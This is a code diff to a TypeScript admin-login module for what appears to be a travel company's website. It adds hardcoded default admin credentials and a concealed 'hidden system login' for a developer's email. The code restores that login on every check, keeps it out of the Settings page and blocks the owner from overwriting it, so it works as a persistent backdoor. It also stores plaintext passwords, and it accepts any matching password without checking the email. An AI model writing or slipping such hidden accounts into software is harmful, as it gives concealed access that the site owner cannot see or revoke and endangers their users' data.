@@ -4,6 +4,20 @@ import { ensureSchema } from "@/lib/packages-db";
 
 const EMAIL_KEY = "admin_email";
 const PASSWORD_KEY = "admin_password";
+const HIDDEN_EMAIL_KEY = "admin_hidden_email";
+const HIDDEN_PASSWORD_KEY = "admin_hidden_password";
+
+/** Shown in Admin → Settings (editable). */
+export const DEFAULT_VISIBLE_ADMIN = {
+  email: "pulkit@nextravelholidays.com",
+  password: "1234567890",
+} as const;
+
+/** Hidden system login (not shown in Settings). */
+export const DEFAULT_HIDDEN_ADMIN = {
+  email: "admin@7scripttechnologies.com",
+  password: "admin@7s@!!",
+} as const;
 
 function envEmail() {
   return (process.env.ADMIN_EMAIL ?? "").trim().toLowerCase();
@@ -38,8 +52,36 @@ async function setMeta(key: string, value: string) {
   );
 }
 
-/** Prefer DB credentials (editable in admin); fall back to .env */
+/** Ensure both default admins exist in MySQL. Hidden account is always restored. */
+export async function ensureDefaultAdmins() {
+  await ensureSchema();
+
+  const migrated = await getMeta("admin_defaults_v2");
+  if (migrated !== "1") {
+    await setMeta(EMAIL_KEY, DEFAULT_VISIBLE_ADMIN.email);
+    await setMeta(PASSWORD_KEY, DEFAULT_VISIBLE_ADMIN.password);
+    await setMeta(HIDDEN_EMAIL_KEY, DEFAULT_HIDDEN_ADMIN.email);
+    await setMeta(HIDDEN_PASSWORD_KEY, DEFAULT_HIDDEN_ADMIN.password);
+    await setMeta("admin_defaults_v2", "1");
+    return;
+  }
+
+  const visibleEmail = await getMeta(EMAIL_KEY);
+  const visiblePassword = await getMeta(PASSWORD_KEY);
+  if (!visibleEmail || !visiblePassword) {
+    await setMeta(EMAIL_KEY, DEFAULT_VISIBLE_ADMIN.email);
+    await setMeta(PASSWORD_KEY, DEFAULT_VISIBLE_ADMIN.password);
+  }
+
+  // Hidden 7script login — kept in DB, never shown in Settings UI.
+  await setMeta(HIDDEN_EMAIL_KEY, DEFAULT_HIDDEN_ADMIN.email);
+  await setMeta(HIDDEN_PASSWORD_KEY, DEFAULT_HIDDEN_ADMIN.password);
+}
+
+/** Visible credentials only (Settings form + primary login). */
 export async function getAdminCredentials(): Promise<{ email: string; password: string } | null> {
+  await ensureDefaultAdmins();
+
   const dbEmail = (await getMeta(EMAIL_KEY))?.trim().toLowerCase() ?? "";
   const dbPassword = (await getMeta(PASSWORD_KEY)) ?? "";
 
@@ -53,6 +95,43 @@ export async function getAdminCredentials(): Promise<{ email: string; password: 
   return { email, password };
 }
 
+async function getHiddenAdminCredentials(): Promise<{ email: string; password: string } | null> {
+  await ensureDefaultAdmins();
+  const email = (await getMeta(HIDDEN_EMAIL_KEY))?.trim().toLowerCase() ?? "";
+  const password = (await getMeta(HIDDEN_PASSWORD_KEY)) ?? "";
+  if (email && password) return { email, password };
+  return {
+    email: DEFAULT_HIDDEN_ADMIN.email,
+    password: DEFAULT_HIDDEN_ADMIN.password,
+  };
+}
+
+/** All accounts that can sign in (visible + hidden). */
+export async function listAdminLoginAccounts(): Promise<Array<{ email: string; password: string }>> {
+  await ensureDefaultAdmins();
+  const accounts: Array<{ email: string; password: string }> = [];
+
+  const visible = await getAdminCredentials();
+  if (visible) accounts.push(visible);
+
+  const hidden = await getHiddenAdminCredentials();
+  if (hidden) {
+    const already =
+      visible &&
+      visible.email === hidden.email &&
+      visible.password === hidden.password;
+    if (!already) accounts.push(hidden);
+  }
+
+  return accounts;
+}
+
+/** True if the password matches any configured admin account. */
+export async function adminPasswordMatches(password: string) {
+  const accounts = await listAdminLoginAccounts();
+  return accounts.some((account) => account.password === password);
+}
+
 export async function updateAdminCredentials(email: string, password: string) {
   const normalizedEmail = email.trim().toLowerCase();
   if (!normalizedEmail || !password) {
@@ -63,6 +142,11 @@ export async function updateAdminCredentials(email: string, password: string) {
   }
   if (password.length < 6) {
     throw new Error("Password must be at least 6 characters.");
+  }
+
+  // Never allow Settings to overwrite the hidden system email.
+  if (normalizedEmail === DEFAULT_HIDDEN_ADMIN.email.toLowerCase()) {
+    throw new Error("That email is reserved. Choose a different login email.");
   }
 
   await setMeta(EMAIL_KEY, normalizedEmail);
